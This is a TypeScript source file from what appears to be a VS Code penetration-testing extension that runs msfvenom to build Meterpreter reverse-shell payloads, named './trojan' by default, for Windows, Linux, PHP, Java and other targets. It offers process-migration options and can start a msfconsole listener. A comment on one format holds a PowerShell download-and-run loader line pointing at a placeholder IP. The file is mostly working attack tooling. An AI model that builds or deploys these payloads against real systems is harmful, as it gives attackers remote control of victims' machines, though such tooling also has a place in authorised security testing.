import * as vscode from "vscode";
import { callback } from "../../../shared/types";
import { logger } from "../../../platform/vscode/logger";
import { CreateTaskLikeInteractiveTerminal } from "../terminals/taskTerminal";
import { variables } from "../../../platform/vscode/variables";

let msfpaylaodtypes = [
  "windows/x64/meterpreter/reverse_tcp",
  "windows/meterpreter/reverse_tcp",
  "linux/x64/meterpreter/reverse_tcp",
  "linux/x86/meterpreter/reverse_tcp",
  "php/meterpreter/reverse_tcp",
  "python/meterpreter/reverse_tcp",
  "windows/meterpreter/reverse_http",
  "windows/x64/meterpreter/reverse_http",
  "windows/meterpreter/reverse_https",
  "windows/x64/meterpreter/reverse_https",
  "java/meterpreter/reverse_tcp",
];

let formats = [
  "exe",
  "elf",
  "psh # psh is powershell payload with loader using `IEX(New-Object System.Net.WebClient).DownloadString('http://YOURIP:80/<output>.ps1');` to load in memory ",
  "dll",
  "hta-psh",
  "psh-cmd",
  "psh-net",
  "psh-reflection",
  "elf-so",
  "exe-service",
  "raw # php python java meterpreter will meet error if you choose like php python",
  "raw | xxd -i # you can use this to get shellcode (but you need output in /dev/stdout)",
  "jsp",
  "jar",
  "war",
  "pl",
  "asp",
  "aspx",
  "msi",
  "python-reflection",
  "vba",
  "vba-exe",
  "vba-psh",
  "vbs",
];

let advanced = [
  "",
  "PrependMigrate=true PrependMigrateProc=explorer.exe",
  "PrependFork=true",
  "PrependSetuid=true",
  "PrependSetresuid=true",
  "PrependSetreuid=true",
  "PrependChrootBreak=true",
  "AutoSystemInfo=false",
];

export let msfvenomPayloadCreation: callback = async (args) => {
  let msfconsolePath = vscode.workspace
    .getConfiguration("weaponized")
    .get<string>("msf.venom");
  if (!msfconsolePath) {
    vscode.window.showErrorMessage(
      "Please set the 'weaponized.msf.venom' configuration in settings."
    );
    return;
  }

  let payload: string | undefined = args?.payload;
  if (!args || !args.payload) {
    payload = await vscode.window.showQuickPick(msfpaylaodtypes, {
      placeHolder: "Select a payload type",
    });
  }
  if (!payload) {
    vscode.window.showErrorMessage("No payload selected. Operation cancelled.");
    return;
  }

  let lhost = vscode.workspace
    .getConfiguration("weaponized")
    .get<string>("lhost", "$LHOST");
  let lport = vscode.workspace
    .getConfiguration("weaponized")
    .get<string>("lport", "$LPORT");

  if (!lhost || !lport) {
    vscode.window.showErrorMessage("LHOST or LPORT not configured.");
    return;
  }

  // Continue with payload creation...
  let format: string | undefined = args?.format;
  if (!args || !args.format) {
    format = await vscode.window.showQuickPick(formats, {
      placeHolder: "Select a format",
    });
  } else {
    if (typeof args.format !== "string" || !formats.includes(args.format)) {
      vscode.window.showErrorMessage(
        "Invalid format got. Operation cancelled."
      );
      return;
    }
    format = args.format;
  }
  if (!format) {
    vscode.window.showErrorMessage("No format selected. Operation cancelled.");
    return;
  }
  logger.debug("output format: " + format);

  let advancedOptions: string[] | undefined = args?.advanced;
  if (!args || !args.advanced) {
    advancedOptions = await vscode.window.showQuickPick(advanced, {
      placeHolder: "Select advanced options",
      canPickMany: true,
    });
  } else {
    if (typeof args.advanced === "string") {
      advancedOptions = [args.advanced];
    } else if (Array.isArray(args.advanced)) {
      advancedOptions = args.advanced;
    } else {
      vscode.window.showErrorMessage(
        "Invalid advanced options format. Operation cancelled."
      );
      return;
    }
  }
  if (!advancedOptions) {
    vscode.window.showErrorMessage(
      "No advanced options selected. Operation cancelled."
    );
    return;
  }

  let output: string | undefined = args?.output;
  if (!args || !args.output) {
    output = await vscode.window.showInputBox({
      prompt: "Enter output file name (without extension)",
      placeHolder: "output",
      value: "./trojan",
    });
  } else {
    if (typeof args.output !== "string") {
      vscode.window.showErrorMessage(
        "Invalid output file name format. Operation cancelled."
      );
      return;
    }
    output = args.output;
  }
  if (!output) {
    vscode.window.showErrorMessage(
      "No output file name provided. Operation cancelled."
    );
    return;
  }
  output = variables(output); // process the variables like ${workspaceFolder}

  let runHandler: boolean = false;
  logger.info("ask startListen?");
  if (!args || args.startListen === undefined) {
    let select = await vscode.window.showQuickPick(["Yes", "No"], {
      placeHolder: "Do you want to start the listener?",
    });
    if (select === "Yes") {
      runHandler = true;
    }
  } else {
    runHandler = args.startListen;
  }

  let argsArray: string[] = [
    msfconsolePath,
    "-p",
    payload,
    `LHOST=${lhost}`,
    `LPORT=${lport}`,
    ...advancedOptions,
    "-o",
    output,
    "-f",
    format,
  ];

  CreateTaskLikeInteractiveTerminal("msfvneom payload creation", argsArray);

  logger.info("start generating msfvenom payload");

  if (runHandler) {
    const nl = "\r\n";
    CreateTaskLikeInteractiveTerminal(
      "msfvenom handler",
      [
        "msfconsole",
        "-q",
        "-x",
        `'use exploit/multi/handler; set payload ${payload}; set LHOST ${lhost}; set LPORT ${lport}; run -j'`,
      ],
      vscode.TerminalLocation.Panel,
      `add following commands into msfconsole rc file, and reuse the trojan easily: ${nl}${nl}set payload ${payload}${nl}set LHOST ${lhost}${nl}set LPORT ${lport}${nl}run -j${nl}`
    );
    logger.info("start generating msfvenom handler");
  }
};
